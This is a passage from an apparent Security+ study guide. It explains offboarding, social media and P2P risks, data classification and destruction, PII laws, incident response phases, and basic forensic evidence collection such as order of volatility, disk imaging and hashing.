Can you describe the working relationship you had with your supervisor(s)?
What skills and qualification does your replacement need to excel in this position?
Exit interviews are commonly conducted by an employee in the Human Resources (HR) department. In addition to seeking feedback from the employee, departing employees are sometimes required to sign paperwork, such as a reminder about a previously signed NDA. The NDA prevents the employee from sharing proprietary information with personnel outside the organization.
From a security perspective, it’s also important to ensure other things occur during or before the exit interview. example, the user’s account should be disabled (or deleted depending on company policy). Ideally, this should occur during the interview. One way organizations do this is by informing the IT department of the time of the scheduled interview a day before. An administrator then disables the account after the interview starts. The key is that a departing employee should not have access to computing and network resources after the interview.
It’s also important to collect any equipment (such as smartphones, tablets, or laptops), security badges, or proximity cards the organization issued to the employee. This is more than just a cost issue. Equipment very likely has proprietary data on it and the company needs to take steps to protect the data. Additionally, smart cards and proximity cards can allow individuals access to protected areas.
Onboarding
Onboarding is the process of granting individuals access to an organization’s computing resources after being hired. This includes providing the employee with a user account and granting access to appropriate resources. One of the key considerations during the onboarding process is to follow the principle of least privilege. Grant the new employees access to what they need for their job, but no more.
Offboarding is the process of removing their access. When employees leave the company, it’s important to revoke their access. This is often done during the exit interview.
Policy Violations and Adverse Actions
What do you do if an employee doesn’t follow the security policy? What adverse actions should a supervisor take? Obviously, that depends on the severity of the policy violation.
Imagine that an employee sends out an email to everyone in the organization inviting them to his church. The supervisor might decide to verbally counsel the employee and make it clear
that sending out personal emails like this is unacceptable. Based on how well the conversation goes, the supervisor might choose to document this as written counseling and place the warning in the employee’s HR folder.
Some incidents require more severe responses. Imagine that an employee begins a cyberbullying campaign against another employee. He has been sending her hateful emails and posting hateful messages on social media pages. In most organizations, this bully will be looking for employment elsewhere once his activity is discovered.
Although i t’s possible to document specific adverse actions within a security policy, this is rarely recommended. Actual policy violations aren’t always the same and if the policy requires a specific action in response to a policy violation, it doesn’t always allow supervisors or managers to respond appropriately to a violation.
Other General Security Policies From a more general perspective, an organization may implement personnel management policies that affect other areas of an employee’s life. Some examples include behavior on social media networks and the use of email.
As a simple example, employees of a company should not post adverse comments about other employees or customers. Employees who engage in cyberbullying against fellow employees are typically fired. Similarly, employees who post derogatory comments about customers quickly find themselves looking for other employment.
You might think that people would know that what they post on the Internet can be seen by anyone, including their employer. However, if you do a quick Google search on “employee fired after Facebook post” or “employee fired after tweet,” you’ll find many examples where people ignored the possibility that their words would be seen by their employer.
Another consideration is personal email. Some organizations allow employees to use the organization’s IT infrastructure to send and receive personal email, while other organizations forbid it. The key here is ensuring that employees understand the policy.
Social Media Networks and Applications
Millions of people interact with each other using social media networks and applications, such as Facebook and Twitter. Facebook allows people to share their lives with friends, family, and others. Twitter allows people to tweet about events as they are happening. From a social perspective, these technologies allow people to share information about themselves with others. A user posts a comment and a wide group of people instantly see it.
However, from a security perspective, they present some significant risks, especially related to inadvertent information disclosure. Attackers can use these sites to gain information about individuals and then use that information in an attack. Organizations typically either train users about the risks or block access to the social media sites to avoid the risks.
Users often post personal information, such as birth dates, their favorite colors or books, the high school they graduated from, graduation dates, and much more. Some sites use this personal information to validate users when they forget or need to change their password. Imagine Maggie needs to reset her password for a bank account. The web site may challenge her to enter her birth date, favorite book, and graduation date for validation. This is also known as a cognitive password and, theoretically, only Maggie knows this information. However, if Maggie posts all this information on Facebook, an attacker can use it to change the password on the bank account.
example, David Kernell used Yahoo!’s cognitive password account recovery process to change former Alaska Governor Sarah Palin’s password for her email account. At the time, Yahoo! asked questions such as her high school and birth date and Kernell obtained all the information from online searches. Of course, it didn’t turn out well for him. A jury convicted him of a felony and he served more than a year in prison.
In some cases, attackers have used personal information from social networking sites to launch scams. example, attackers first identify the name of a friend or relative using the social networking site. The attackers then impersonate the friend or relative in an email, claiming to have been robbed and stuck in a foreign country. Attackers end the email with a plea for help asking the victim to send money via wire transfer. It’s also worth considering physical security. While vacationing in Paris, Kim Kardashian West was regularly posting her status and location on social media. She also stressed that she didn’t wear fake jewelry. Thieves robbed her at gunpoint in her Paris hotel room. They bound and gagged her and took one of her rings (that is worth an estimated $4.9 million) and a jewelry box (with jewelry worth an estimated $5.6 million). After being caught and arrested, one of the thieves later admitted that it was relatively easy to track her just by watching her online activity.
Banner Ads and Malvertisements
Attackers have been delivering malware through malicious banner ads for several years now. These look like regular ads, but they contain malicious code. Many of these are Flash applets with malicious code embedded in them, but others just use code to redirect users to another server, such as one with a drive-by download waiting for anyone who clicks.
Although these malvertisements have been on many social media sites, they’ve also appeared on mainstream sites. example, attackers installed a
malvertisement on the New York Times web site where it ran for about 24 hours before webmasters discovered and disabled it.
Similarly, malvertising has appeared on the Yahoo! web site. Users who clicked on some Yahoo! ads were taken to sites hosting fake antivirus software. These sites included pop- ups indicating that users’ systems were infected with malware and encouraging the users to download and install it. Users who took the bait installed malware onto their systems. Some of these ads sent users to sites in Eastern Europe that were hosting CryptoWall, according to research by Blue Coat Systems, Inc. CryptoWall is a malicious form of ransomware that encrypts user files and demands payment to decrypt them.
Attackers have used two primary methods to get these malvertisements installed on legitimate web sites. One method is to attack a web site and insert ads onto that web site. The second method is to buy ads. They often represent an ad agency pretending to represent legitimate clients. example, one attacker convinced Gawker Media to run a series of Suzuki advertisements, which were actually malvertisements. Similarly, it’s unlikely that Yahoo! was
aware that it was hosting malvertising, but instead, these ads likely appeared as a result of attacks or by being tricked.
Social Networking and P2P
Peer-to-peer (P2P or file sharing) applications allow users to share files, such as music, video, and data, over the Internet. Instead of a single server providing the data to end users, all computers in the P2P network are peers, and any computer can act as a server to other clients. The first widely used P2P network was Napster, an online music- sharing service that operated between 1999 and 2001. Users copied and distributed MP3 music files among each other, and these were often pirated music files. The files were stored on each user’s system, and as long as the system was accessible on the Internet, other users could access and download the files. A court order shut down Napster due to copyright issues, but it later reopened as an online music store. Other P2P software and P2P networks continue to appear and evolve.
Organizations usually restrict the use of P2P applications in networks, but this isn’t because of piracy issues. One reason is because the P2P applications can consume network bandwidth, slowing down other systems on the network. Worse, a significant risk with P2P applications is data leakage. Users are often unaware of what data they are sharing. Another risk is that users are often unaware of what data the application downloads and stores on their systems, causing them to host inappropriate data. Two examples help illustrate these data leakage risks.
Information concentrators search P2P networks for information of interest and collect it. Investigators once discovered an information concentrator in Iran with over 200 documents containing classified and secret
U.S. government data. This included classified information about Marine One, the helicopter used by the president. Although the information about Marine One made the headlines, the attackers had much more information. example, this concentrator included Iraq status reports and lists of soldiers with privacy data.
How did this happen? Investigations revealed that a defense contractor installed a P2P application on a computer. The computer had access to this data, and the P2P application shared it.
The media latched onto the news about Marine One, so this story was widely published. However, it’s widely believed that much more data is being mined via P2P networks. Most end users don’t have classified data on their systems, but they do have PII, such as banking information or tax data. When an attacker retrieves data on a user’s system and empties a bank account, it might be a catastrophe to the user, but it isn’t news.
Organizations can restrict access to P2P networks by blocking access in firewalls. Additionally, port scanners can scan open ports of remote systems to identify P2P software. Organizations often include these checks when running a port scanner as part of a vulnerability scan.
Agreement Types
Organizations often utilize different types of agreements to help identify various responsibilities. Many are used when working with other organizations, but they can often be used when working with different departments within the same organization. These include:
Interconnection security agreement (ISA). An ISA specifies technical and security requirements for planning, establishing, maintaining, and disconnecting a secure connection between two or more entities. F o r example, it may stipulate certain types of encryption for all data-in-transit. NIST SP 800-47, “Security Guide for Interconnecting Information Technology Systems,” includes more in-depth information on ISAs.
Service level agreement (SLA). An SLA is an agreement between a company and a vendor that stipulates performance expectations, such as minimum uptime and maximum downtime levels. Organizations use SLAs when contracting services from service providers such as Internet Service Providers (ISPs). Many SLAs include a monetary penalty if the vendor is unable to meet the agreed-upon expectations.
Memorandum of understanding (MOU) or memorandum of agreement (MOA). An MOU/MOA expresses an understanding between two or more parties indicating their intention to work together toward a common goal. An MOU/MOA is often used to support an ISA by defining the purpose of the ISA and the responsibilities of both parties. However, it doesn’t include any technical details. You can also compare an MOU/ MOA with an SLA because it defines the responsibilities of each of the parties. However, it is less formal than an SLA and does not include monetary penalties. Additionally, it doesn’t have strict guidelines in place to protect sensitive data.
- Business partners agreement (BPA). A BPA is a written agreement that details the relationship between business partners, including their obligations toward the partnership. It typically identifies the shares of
profits or losses each partner will take, their responsibilities to each other, and what to do if a partner chooses to leave the partnership. One of the primary benefits of a BPA is that it can help settle conflicts when they arise.
Protecting Data
Every company has secrets. Keeping these secrets can often make the difference between success and failure. A company can have valuable research and development data, customer databases, proprietary information on products, and much more. If the company cannot keep private and proprietary data secret, it can directly affect its bottom line.
Data policies assist in the protection of data and help prevent data leakage. This section covers many of the different elements that may be contained in a data policy.
Information Classification
As a best practice, organizations take the time to identify, classify, and label data they use. Data classifications ensure that users understand the value of data, and the classifications help
protect sensitive data. Classifications can apply to hard data (printouts) and soft data (files). example, the U.S. government uses classifications such as Top Secret, Secret, Confidential, and Unclassified to identify the sensitivity of data. Private companies often use terms such as Proprietary, Private, Confidential, or Public. Note that while the U.S. government has published standards for these classifications, there isn’t a published standard that all private companies use. For comparison, the following statements identify the typical meaning of these public classifications:
Public data is available to anyone. It might be in brochures, press releases, or on web sites. Confidential data is information that an organization intends to keep secret among a certain group of people. example, most companies consider salary data confidential. Personnel within the Accounting department and some executives have access to salary data, but they keep it secret among themselves. Many companies have specific policies in place telling people that they shouldn’t even tell anyone else their salary amount.
A proprietor is an owner and proprietary data is data that is related to ownership. Common examples are information related to patents or trade secrets.
Private data is information about an individual that should remain private. Two classic examples within IT security are Personally Identifiable Information (PII) and Personal Health Information (PHI). Both PII and PHI are covered in more depth later in this chapter.
The labels and classifications an organization uses are not as important as the fact that they use labels and classifications. Organizations take time to analyze their data, classify it, and provide training to users to ensure the users recognize the value of the data. They also include these classifications within a data policy.
Data Sensitivity Labeling and Handling
Data labeling ensures that users know what data they are handling and
processing. example, if an organization classified data as confidential, private, proprietary, and public, it would also use labeling to identify the data. These labels can be printed labels for media such as backup tapes. It’s also possible to label files using metadata, such as file properties, headers, footers, and watermarks.
Consider a company that spends millions of dollars on research and development (R&D) trying to develop or improve products. The company values this proprietary data much more than data publicly available on its web site, and needs to protect it. However, if employees have access to the R&D data and it’s not classified or labeled, they might not realize its value and might not protect it.
F o r example, a web content author might write an article for the company’s web site touting its achievements. If the R&D data isn’t classified and labeled, the author might include some of this R&D data in the article, inadvertently giving the company’s competitors free access to proprietary data. Although the R&D employees will easily recognize the data’s value, it’s not safe to assume that everyone does. In contrast, if the data is labeled, anyone would recognize its value and take appropriate steps to protect it.
Chapter 9,“Implementing Controls to Protect Assets,” presents information on backups. As a reminder, it’s important to protect backups with the same level of protection as the original data. Labels on backup media help personnel easily identify the value of the data on the backups.
Data Destruction and Media Sanitization
When computers reach the end of their life cycles, organizations donate them, recycle them, or sometimes just throw them away. From a security perspective, you need to ensure that the computers don’t include any data that might be useful to people outside your organization or damaging to your organization if unauthorized people receive it.
It’s common for organizations to have a checklist to ensure that personnel sanitize a system prior to disposing of it. The goal is to ensure that personnel remove all usable data from the system. Hard drives represent the greatest risk because they hold the most information, so it’s important to take additional steps when decommissioning old hard drives. Simply deleting a file on a drive doesn’t actually delete it. Instead, it marks the file for deletion and makes the space available for use. Similarly, formatting a disk drive doesn’t erase the data. There are many recovery applications available to recover deleted data, file remnants, and data from formatted drives. Data destruction isn’t limited to only hard drives. Organizations often have a policy related to paper containing any type of sensitive data. Shredding or incinerating these papers prevents them from falling into the wrong hands. If personnel just throw this paper away, dumpster divers can sift through the trash and gain valuable information. An organization also takes steps to destroy other types of data, such as backup tapes, and other types of devices, such as removable media. Some common methods used to destroy data and sanitize media are:
Purging. Purging is a general sanitization term indicating that all sensitive data has been removed from a device.
File shredding. Some applications remove all remnants of a file
using a shredding technique. They do so by repeatedly overwriting the space where the file is located with 1s and 0s.
Wiping. Wiping refers to the process of completely removing all remnants of data on a disk. A disk wiping tool might use a bit-level overwrite process that writes different patterns of 1s and 0s multiple times and ensures that the data on the disk is unreadable.
Erasing and overwriting. Solid-state drives (SSDs) require a special process for sanitization. Because they use flash memory instead of magnetic storage platters, traditional drive wiping tools are not effective. Some organizations require personnel to physically destroy SSDs as the only acceptable method of sanitization.
Burning. Many organizations burn materials in an incinerator. Obviously, this can be done with printed materials, but isn’t as effective with all materials.
Paper shredding. You can physically shred papers by passing them through a shredder. When doing so, it’s best to use a cross-cut shredder that cuts the paper into fine particles. Large physical shredders can even destroy other hardware, such as disk drive platters removed from a disk drive.
Pulping. Pulping is an additional step taken after shredding paper. It reduces the shredded paper to mash or puree.
Degaussing. A degausser is a very powerful electronic magnet. Passing a disk through a degaussing field renders the data on tape and magnetic disk drives unreadable.
Pulverizing. Pulverizing is the process of physically destroying media to sanitize it, such as with a sledge hammer (and safety goggles). Optical media is often pulverized because it is immune to degaussing methods and many shredders can’t handle the size of optical media. It’s also possible to remove disk platters from disk drives and physically destroy them.
It’s also worth mentioning that hard drives and other media can be in devices besides just computers. example, many copy machines include disk drives, and they can store files of anything that employees recently copied or printed. If personnel don’t sanitize the drives before disposing of these devices, it can also result in a loss of confidentiality.
Data Retention Policies
A data retention policy identifies how long data is retained, and
sometimes specifies where it is stored. This reduces the amount of resources, such as hard drive space or backup tapes, required to retain the data. Retention policies also help reduce legal liabilities. example, imagine if a retention policy states that the company will only keep email for one year. A court order requiring all email from the company can only expect to receive email from the last year.
On the other hand, if the organization doesn’t have a retention policy, it might need to provide email from the past 10 years or longer in response to a court order. This can require an extensive amount of work by administrators to recover archives or search for specific emails. Additionally, investigations can uncover other embarrassing evidence from previous years. The retention policy helps avoid these problems.
Some laws mandate the retention of data for specific time frames, such as three years or longer. example, laws mandate the retention of all White House emails indefinitely. If a law
applies to an organization, the retention policy reflects the same requirements.
PII and PHI
Personally Identifiable Information (PII) is personal information that can be used to personally identify an individual. Personal Health Information (PHI) is PII that includes health information. Some examples of PII are:
Full name
Birthday and birth place
Medical and health information
Street or email address information
Personal characteristics, such as biometric data
Any type of identification number, such as a Social Security number (SSN) or driver’s license number
In general, you need two or more pieces of information to make it PII. example, “John Smith” is not PII by itself because it can’t be traced back to a specific person. However, when you connect the name with a birth date, an address, medical information, or other data, it is PII.
When attackers gain PII, they often use it for financial gain at the expense of the individual. example, attackers steal identities, access credit cards, and empty bank accounts. Whenever possible, organizations should minimize the use, collection, and retention of PII. If it’s not kept, it can’t be compromised. On the other hand, if they collect PII and attackers compromise the data, the company is liable.
The number of security breach incidents resulting in the loss of PII continues to rise. example, a Veteran’s Affairs (VA) employee copied a database onto his laptop that contained PII on over 26 million U.S. veterans. He took the laptop home and a burglar stole it. The VA then went through the painful and expensive process of notifying all of the people who were vulnerable to identity theft, and the affected individuals spent countless hours scouring their records for identity theft incidents. Even though police later recovered the laptop, the VA paid $20 million to settle a lawsuit in the case.
This is not an isolated incident. The Identity Theft Resource Center tracks data breaches and lists them on their site (http://www.idtheftcenter.org/). Their 2015 report reported the number of
known U.S. data breaches at 780, exposing more than 177 million records containing PII and/or PHI. Some data breaches were small, affecting only a few hundred people. Others were large such as the attack on Scottrade, accessing more than 4.6 million records. Many times, the
 companies don’t even report how many records were accessed, so the number of data records in the hands of criminals is very likely much higher.
Each of these instances resulted in potential identity theft and the loss of goodwill and public trust of the company. Both customers and employees were negatively impacted, and the companies were forced to spend time and energy discussing the incident, and spend money trying to repair their reputations.
Protecting PII and PHI
Organizations have an obligation to protect PII. There are many laws that mandate the protection of PII, including international laws, federal laws, and local regulations. Organizations often develop policies to identify how they handle, retain, and distribute PII, and these policies help ensure they are complying with relevant regulations. When a company doesn’t use a specific
PII policy, it usually identifies methods used to protect PII in related data policies.
Many laws require a company to report data losses due to security breaches. If an attack results in the loss of customer PII data, the company is required to report it and notify affected individuals. example, Arizona enacted a security breach notification law that requires any company doing business in Arizona to notify customers of security breaches. Most states in the United States have similar laws, and similar international laws exist.
One of the common reasons data seems to fall into the wrong hands is that employees don’t understand the risks involved. They might not realize the value of the data on a laptop, or they might casually copy PII data onto a USB flash drive. As mentioned previously, data classification and labeling procedures help employees recognize the data’s value and help protect sensitive data.
Training is also important. One of the goals of security professionals is to reinforce the risks of not protecting PII. When employees understand the risks, they are less likely to risk customer and employee data to identity theft. Additionally, if employees need to transmit PII over a network, they can ensure it’s protected by using encryption. As mentioned previously in this book, encrypting data-in-transit provides strong protection against loss of
confidentiality.
Many governments have enacted laws mandating the protection of both PII and PHI. Also, there are many documents that provide guidance on how to protect it. The National Institute of Standards and Technology (NIST) created Special Publication (SP) 800-122 “Guide to Protecting the Confidentiality of Personally Identifiable Information (PII).” It identifies many specific safeguards that organizations can implement to protect PII along with steps to take in response to a data breach involving PII. You can access all the NIST publications at
http://csrc.nist. gov/publications/PubsSPs.html.
Legal and Compliance Issues
Organizations have a responsibility to follow all laws that apply to them, and ensure that they remain in compliance. Within the context of data security and privacy, the following laws are often a key concern:
Health Insurance Portability and Accountability Act of 1996 (HIPAA). HIPAA mandates that organizations protect PHI. This includes any information directly related to the health of an
 individual that might be held by doctors, hospitals, or any health facility. It also applies to any information held by an organization related to health plans offered to employees. Fines for not complying with the law have been as high as $4.3 million.
Gramm-Leach Bliley Act (GLBA). This is also known as the Financial Services Modernization Act and includes a Financial Privacy Rule. This rule requires financial institutions to provide consumers with a privacy notice explaining what information
they collect and how that information is used.
Sarbanes-Oxley Act (SOX). SOX was passed after several accounting scandals by major corporations, such as Enron and WorldCom. Companies were engaging in accounting fraud to make their financial condition look better than it was and prop up their stock price. example, Enron’s stock value was over $90 in 2000, but executives knew of problems and began selling their stock. As the scandal emerged, the stock crashed to
$42 a year later, and $15 in October of 2001. In December 2002, the stock was worthless at six cents a share, effectively wiping out $60 billion in investments. SOX requires that executives within an organization take individual responsibility for the accuracy of financial reports. It also includes specifics related to auditing, and identifies penalties to individuals for noncompliance. General Data Protection Regulation (GDPR). This European Union (EU) directive supersedes the Data Protection Directive (also known as Directive 95/46/EC). Both mandate the protection of privacy data for individuals within the EU.
While this section outlined four specific laws related to data, there are others. The key is that organizations have a responsibility to know which laws apply to them and remain in compliance with the laws.
Data Roles and Responsibilities
Many people within the organization handle data. However, an organization often assigns specific roles to some people. Each of these roles has specific responsibilities as outlined in the following list:
Owner. The data owner is the individual with overall responsibility for the data. It is often a high- level position such as the chief executive officer (CEO) or a department head. The data owner is responsible for identifying the classification of the data, ensuring the data is labeled to match the classification, and ensuring security controls are implemented to protect the data. Steward/custodian. A data steward or data custodian handles the routine tasks to protect data. example, a data custodian would ensure data is backed up in accordance with a backup policy. The
custodian would also ensure that backup tapes are properly labeled to match the classification of the data and stored in a location that provides adequate protection for the classification of the data. Data owners typically delegate tasks to the data custodian.
Privacy officer. A privacy officer is an executive position within an organization. This person is primarily responsible for ensuring that the organization is complying with relevant laws. example, if the organization handles any PHI, the privacy officer ensures the organization complies with HIPAA. If SOX applies to the organization, the privacy officer ensures that the organization is complying with SOX. Responding to Incidents
Many organizations create incident response policies to help personnel identify and respond to incidents. A security incident is an adverse event or series of events that can negatively affect the confidentiality, integrity, or availability of data or systems within the organization, or that has the potential to do so.
Some examples include attacks, release of malware, security policy violations, unauthorized access of data, and inappropriate usage of systems. example, an attack resulting in a data breach is a security incident. Once the organization identifies a security incident, it will respond based on the incident response policy.
Organizations regularly review and update the policy. Reviews might occur on a routine schedule, such as annually, or in response to an incident after performing a lessons learned review of the incident.
example, in the early days of computers, one hacker broke into a government system and the first thing he saw was a welcome message. He started poking around, but authorities apprehended him. Later, when the judge asked him what he was doing, he replied that when he saw the welcome message, he thought it was inviting him in. The lesson learned here was that a welcome message can prevent an organization from taking legal action against an intruder. Government systems no longer have welcome messages. Instead, they have warning banners stressing that only authorized personnel should be accessing the system. It’s common to see similar warning banners when logging on to any system today.
NIST SP 800-61 Revision 2, “Computer Security Incident Handling Guide,” provides comprehensive guidance on how to respond to incidents. It is 79 pages so it’s obviously more in- depth than this section, but if you want to dig deeper into any of these topics, it’s an excellent resource. Use your favorite search engine and search for “NIST SP 800-61.”
Incident Response Plan
An incident response plan (IRP) provides more detail than the incident response policy. It provides organizations with a formal, coordinated plan personnel can use when responding to an incident. Some of the common elements included with an incident response plan include: Definitions of incident types. This section helps employees identify the difference between an event (that might or might not be a security incident) and an actual incident. Some types of incidents include attacks from botnets, malware delivered via email, data breach, and a ransom demand after a criminal encrypts an organization’s data. The plan may group these incident types using specific category definitions, such as attacks, malware infections, and data breaches. Cyber-incident response teams. A cyber-incident response team is composed of employees with expertise in different areas. Organizations often refer to the team as a
cyber-incident response team, a computer incident response team (CIRT), or a security incident response team. Combined, they have the knowledge and skills to respond to an incident. Due to the complex nature of incidents, the team often has extensive training. Training includes concepts, such as how to identify and validate an incident, how to collect evidence, and how to protect the collected evidence.
Roles and responsibilities. Many incident response plans identify specific roles for an incident response team along with their responsibilities. example, an incident response team might include someone from senior management with enough authority to get things done, a network administrator or engineer with the technical expertise necessary to understand the problems, a security expert who knows how to collect and analyze evidence, and a communication expert to relay information to the public if necessary.
Escalation. After identifying an incident, personnel often need to escalate it. Escalation can require a technician to inform his supervisor that he discovered a malware infection and is resolving it. If critical servers are under attack from a protracted distributed denial- of-service (DDoS) attack, escalation can require all members of the incident response team to get involved in responding to the incident.
Reporting requirements. Depending on the severity of the incident, security personnel might need to notify executives within the company of the incident. Obviously, they wouldn’t notify executives of every single incident. However, they would notify executives about serious incidents that have the potential to affect critical operations. If the incident involves a data breach, personnel need to identify the extent of the loss, and determine if outside entities are affected. example, if attackers successfully attacked a system and collected customer data such as credit information, the organization has a responsibility to notify customers of the data breach as soon as possible. The incident response plan outlines who needs to be notified and when. Exercises. One method of preparing for incident response is to perform exercises. These can test the response of all members of the team. example, a technical exercise can test the administrator’s
ability to rebuild a server after a simulated attack. Mock interviews or press conferences can test the team’s responses to the media. NIST SP 800- 84, “Guide to Test, Training, and Exercise Programs for IT Plans and Capabilities,” provides much more in-depth information about performing exercises.
Incident Response Process
Incident response includes multiple phases. It starts with creating an incident response policy and an incident response plan. With the plan in place, personnel are trained and given the tools necessary to handle incidents. Ideally, incident response preparation will help an organization prevent an incident. However, this isn’t realistic for most organizations, but with an effective plan in place, the organization will be able to effectively handle any incidents that occur.
Some of the common phases of an incident response process are:
Preparation. This phase occurs before an incident and provides guidance to personnel on how to respond to an incident. It includes establishing and maintaining an incident response plan and incident response procedures. It also includes establishing procedures to prevent incidents. example, preparation includes implementing security controls to prevent malware infections.
Identification. All events aren’t security incidents so when a potential incident is reported, personnel take the time to verify it is an actual incident. example, intrusion detection systems (IDSs) might falsely report an intrusion, but administrators would investigate it and verify if it is a false positive or an incident. If the incident is verified, personnel might try to isolate the system based on established procedures.
Containment. After identifying an incident, security personnel attempt to isolate or contain it. This might include quarantining a device or removing it from the network. This can be as simple as unplugging the system’s network interface card to ensure it can’t communicate on the network. Similarly, you can isolate a network from the Internet by modifying access control lists on a router or a network firewall. This is similar to how you’d respond to water spilling from an overflowing sink. You wouldn’t start cleaning up the water until you first turn off the faucet. The goal of isolation is to prevent the problem from spreading to other areas or other computers in your network, or to simply stop the attack.
Eradication. After containing the incident, it’s often necessary to remove components from the attack. F o r example, if attackers installed malware on systems, it’s important to remove all remnants of the malware on all hosts within the organization. Similarly, an attack might have been launched from one or more compromised accounts. Eradication would include deleting or disabling these accounts.
Recovery. During the recovery process, administrators return all affected systems to normal operation and verify they are operating normally. This might include rebuilding systems from images, restoring data from backups, and installing updates. Additionally, if administrators have identified the vulnerabilities that caused the incident, they typically take steps to remove the vulnerabilities.
Lessons learned. After personnel handle an incident, security personnel perform a lessons learned review. I t ’s very possible the incident provides some valuable lessons and the organization might modify procedures or add additional controls to prevent a recurrence of the incident. A review might indicate a need to
provide additional training to users, or indicate a need to update the incident response policy. The goal is to prevent a future recurrence of the incident.
Implementing Basic Forensic Procedures
A forensic evaluation helps the organization collect and analyze data as evidence it can use in the prosecution of a crime. In general, forensic evaluations proceed with the assumption that the data collected will be used as evidence in court. Because of this, forensic practices protect evidence to prevent modification and control evidence after collecting it.
Once the incident has been contained or isolated, the next step is a forensic evaluation. What do you think of when you hear forensics? Many people think about the TV program CSI (short for “crime scene investigation”) and all of its spin-offs. These shows demonstrate the phenomenal capabilities of science in crime investigations.
Computer forensics analyzes evidence from computers to determine details on computer incidents, similar to how CSI personnel analyze evidence from crime scenes. It uses a variety of different tools to gather and analyze computer evidence. Computer forensics is a growing field, and many educational institutions offer specialized degrees around the science. Although you might not be the computer forensics expert analyzing the evidence, you should know about some of the basic concepts related to gathering and preserving the evidence.
Forensic experts use a variety of forensic procedures to collect and protect data after an attack. A key part of this process is preserving the evidence during the data acquisition phase. In other ▪


## words, they ensure that they don’t modify the data as they collect it, and they protect it after collection. A rookie cop wouldn’t walk through a pool of blood at a crime scene, at least not more than once. Similarly, employees shouldn’t access systems that have been attacked or power them down.
example, files have properties that show when they were last accessed. However, in many situations, accessing the file modifies this property. If the file is evidence, then accessing it has modified the evidence. This can prevent an investigation from identifying when an attacker accessed the file. Additionally, data in a system’s memory includes valuable evidence, but turning a system off deletes this data. In general, an incident response team does not attempt to analyze evidence until they have taken the time to collect and protect it.
Forensic experts have specialized tools they can use to capture data. example, many experts use EnCase Forensic by Guidance Software or Forensic Toolkit (FTK) by AccessData. These tools can capture data from memory or disks. This includes documents, images, email, webmail, Internet artifacts, web history, chat sessions, compressed files, backup files, and encrypted files. They can also capture data from smartphones and tablets.
Kali Linux includes a wide variety of forensic tools. Feel free to dig into any of them to learn more. They are available via the Applications > Forensics menu.
Order of Volatility
refers to the order in which you should collect evidence.
Volatile doesn’t mean it’s explosive, but rather that it is not permanent.
collect evidence starting with the most volatile and moving to the least volatile.
Example
random access memory (RAM) is lost after powering down a computer. So you shouldn’t power a computer down if it has been involved in a security incident and might hold valuable evidence.
  - A processor can only work on data in RAM, so all the data in RAM indicates what the system was doing. This includes data users have been working on, system processes, network processes, application remnants, and much more. turns the computer off, the evidence is lost.
Many forensic tools include the ability to capture volatile data.
  - example, Kali Linux includes the application Volatility (available in Applications
> Forensics > Volatility) that can capture the contents of RAM.
  - Once it’s captured, experts can analyze it and gain insight into what the computer
and user were doing.
In contrast, data on a disk drive remains on the drive even after powering a system down. This includes any files and even low-level data such as the Master Boot Record on a
drive. However, it’s important to protect the data on the disk before analyzing it, and a common method is by capturing an image of the disk.
The order of volatility from most volatile to least volatile is:
  - Data in cache memory, including the processor cache and hard drive cache
         - Data in RAM, including system and network processes
  - A paging file (sometimes called a swap file) on the system disk drive
  - the page file is an extension of RAM and it is stored on the hard drive. However, the page file isn’t a typical file and it’s rebuilt when the system is rebooted, making it more volatile than other files stored on hard drives.
  - Data stored on local disk drives
  - Logs stored on remote systems
  - Archive media
Data Acquisition and Preservation of Evidence
When performing data acquisition for evidence, it’s important to follow specific procedures to ensure that the evidence is not modified. The following sections provide more information on these procedures.
Capture System Image
A forensic image of a disk captures the entire contents of the drive. Some tools use bit-by- bit copy methods that can read the data without modifying it. Other methods include hardware devices connected to the drive to write-protect it during the copy process.
Chapter 5, “Securing Hosts and Data,” introduces disk images as a
common method used to deploy systems. These system disk images include mandatory security configurations and help ensure a system starts in a secure state. A distinct difference between standard system images and forensic images is that a forensic image is an exact copy and does not modify the original. This isn’t always true with system imaging tools.
One of the oldest disk imaging tools used for forensics is the dd command available in Linux systems, including Kali Linux. It can also be installed on Windows systems. To see how dd works, check out the labs for this chapter at http://gcgapremium.com/501labs/.
These methods capture the entire contents of the disk, including system files, user files, and files marked for deletion but not overwritten. Similarly, many tools include the ability to capture data within volatile memory and save it as an image.
After capturing an image, experts create a copy and analyze the copy. They do not analyze the original disk and often don’t even analyze the original image. They understand that by analyzing the contents of a disk directly, they can modify the contents. By creating and analyzing forensic copies, they never modify the original evidence.
Take Hashes
Hashing is an important element of forensic analysis to provide proof that collected data has retained integrity. Chapter 10, “Understanding Cryptography and PKI,” covers hashes and hashing. As a reminder, a hash is simply a number. You can execute a hashing algorithm against data as many times as you want, and as long as the data is the same, the hash will be the same. The focus in Chapter 10 is on using hashes with files and messages. A captured forensic image (from RAM or a disk) is just a file, and you can use hashing with forensic images to ensure image integrity.
 If you do the dd lab mentioned previously, it includes steps to create a copy of the image. After creating the copy, you also have a chance to use the sha1sum command to create and compare hashes.
example, after capturing an image of a disk, an expert can create a hash of the image. The expert can then write-protect the image to prevent accidental modifications during the analysis. Later, the expert can take another hash of the image and compare it with the original hash. As long as both hashes are the same, it provides proof that the image is the same and the analysis did not modify it.
Forensic analysts sometimes make a copy of the image to analyze, instead of analyzing the first image they capture. If they ever need to verify the integrity of the copy, they run the same hashing algorithm against it. Again, as long as the hash is the same, they know the analyzed data is the same as the captured data.
Similarly, some tools allow you to create a hash of an entire drive. These verify that the imaging process has not modified data. example, you can create a hash of a drive before capturing the image and after capturing the image. If the hashes are the same, it verifies that the imaging process did not modify the drive.
Network Traffic and Logs
A forensic investigation often includes an analysis of network traffic and available logs. This information helps the investigators re-create events leading up to and during an incident. example, an organization might want to prove that a specific computer was involved in an attack. One way is to match the media access control (MAC) address used by the attacking computer with an existing computer. The MAC address is permanently assigned to a network interface card, and even though the operating system can be manipulated to use a different MAC, the actual MAC isn’t changed. In contrast, the IP address and name of the computer are not permanently assigned, and it is relatively easy to change them.
Chapter 8, “Using Risk Management Tools,” covers protocol analyzers used to analyze data packets. Data within packets identifies the computers involved in a conversation based on their
IP address and their MAC address. If a data capture shows a MAC address matches the actual MAC address of a suspected computer, it provides a strong indication the computer was involved in the attack.
Similarly, if the attack came from the Internet, you can trace the IP address back to the Internet Service Provider (ISP). ISPs issue IP addresses to users and the ISP logs identify exactly who was issued an IP address at any given time. This is often effective at catching amateur hackers, but professional criminals use a variety of tools to mask their actual address.
Chapter 8 presents information on logs. Logs record what happened during an event, when it happened, and what account was used during the event. You might remember that a Security log records logon and logoff events. Similarly, many applications require users to authenticate, and applications log authentication events. All of these logs can be invaluable in re-creating the details of an event after a security incident, including the identity of the account used in the attack. Capture Video
